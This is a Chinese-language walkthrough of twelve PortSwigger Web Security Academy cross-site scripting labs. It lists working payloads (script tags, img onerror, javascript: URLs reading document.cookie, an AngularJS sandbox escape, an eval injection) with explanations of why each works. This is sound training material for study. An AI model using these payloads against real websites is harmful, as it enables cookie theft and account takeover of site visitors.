#PortSwigger:Cross-site scripting实战
##关卡一： Reflected XSS into HTML context with nothing encoded
**攻击Payload**:<script>alert(1)</script>

##关卡二：Stored XSS into HTML context with nothing encoded
**攻击Payload**:1.在留言板写上<script>alert(1)</script>
               2.剩下的按要求填好即可

##关卡三：DOM XSS in document.write sink using source location.search
**攻击Payload**:"><svg onload=alert(1)>闭合前面，输出后面内容，造成弹窗

##关卡四：DOM XSS in innerHTML sink using source location.search
**攻击Payload**:<img src=1 onerror=alert(1)>

##关卡五：DOM XSS in jQuery anchor href attribute sink using location.search source
**攻击Payload**：URL参数returnPath后面写上javascript:alert(document.cookie)
**原理**：returnPath告诉页面 “点击返回按钮之后跳转到哪里”,加入javascript伪协议，可以直接使网页跳转

##关卡六：DOM XSS in jQuery selector sink using a hashchange event
**攻击payload**:<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
**原理**：<iframe></iframe>(画中画)在当前网页里嵌入一个新的网页【卧底】
         src="https://YOUR-LAB-ID.web-security-academy.net/#"当前网页【潜伏地点】
         onload:触发器，使之执行后续代码【接头人】1.
         onerror:执行者，传送到<img>【接头人传递信息】
         onload="this.src+='<img src=x onerror=print()>执行<img>并输出内容
##总结：我方派出卧底【恶意代码】，在目标公司潜伏等待有缘人打开网站访问，然后传递信息给我【传到我的服务器】
         
##关卡七：Reflected XSS into attribute with angle brackets HTML-encoded
**攻击payload**:"onmouseover="alert(1)【属性上下文】
**原理**："（双引号）闭合前面一个标签
          onmouseover:鼠标悬浮于页面上方触发
          alert(1):标准验证弹窗

##关卡八：Stored XSS into anchor href attribute with double quotes HTML-encoded【伪协议绕过】
**攻击payload**:javascript:alert(1)
**原理**：输入框最终渲染在'<a href='...'>'中，采用伪代码使浏览器直接执行javascript后的代码

##关卡九：Reflected XSS into a JavaScript string with angle brackets HTML encoded【上下文逃逸】
**攻击payload**:'-alert(1)-'
**原理**：'（单引号）闭合前面字符串
          -（减号）强制JS引号将两边作为表达式执行，触发alert(1)

##关卡十：DOM XSS in document.write sink using source location.search inside a select element
**攻击payload**:在URLproduct?productId=1后面加上&storeId="></select><img%20src=1%20onerror=alert(1)>
**原理**：1.&：URL中用来连接多个参数的分隔符
          2.storeId:它是前端里写死的代码，查看页面源代码，搜索document.write,找到缺口
          3."：闭合原本代码
          4.>闭合标签
          5.</select>强制关闭下拉标签
          6.20%URL里的空格

##关卡十一：DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
**攻击payload**:{{$on.constructor('alert(1)')()}}
**原理**：1.页面有 `ng-app`，AngularJS 会解析 `{{ }}` 里面的表达式，我们用 `$on.constructor` 绕过 AngularJS 的沙箱，执行原生 JS，这叫 **AngularJS CSTI（客户端模板注入）**
          2.`$on`：是 AngularJS scope 自带的事件监听方法（`scope.$on`），它本身是一个**函数**
          3.`.constructor`：任何 JS 函数的 `constructor` 就是 **原生 Function 构造器**

##关卡十二：Reflected DOM XSS【反射型】
**攻击payload**:\"};alert(1)//
**原理**：1.在输入框输入字符，跳转后点击F12，发现在searchResults.js中包含有eval()危险函数，会直接拼接执行eval('var searchResultsObj='+this.responseText);
          2.在BP抓包中会有一段json{"searchTerm":"test"}
          3.输入\"};alert(1)//，eval后的代码会变为'var searchResultsObj={"searchTerm":"\\"};alert(1)//"}'
          4.\\被JS解释为反斜杠字符
          5."（双引号）闭合了searchTerm
          6.}闭合了对象
          7.；（分号）结束了var声明
          8.//将后面的全部注释，防止报错


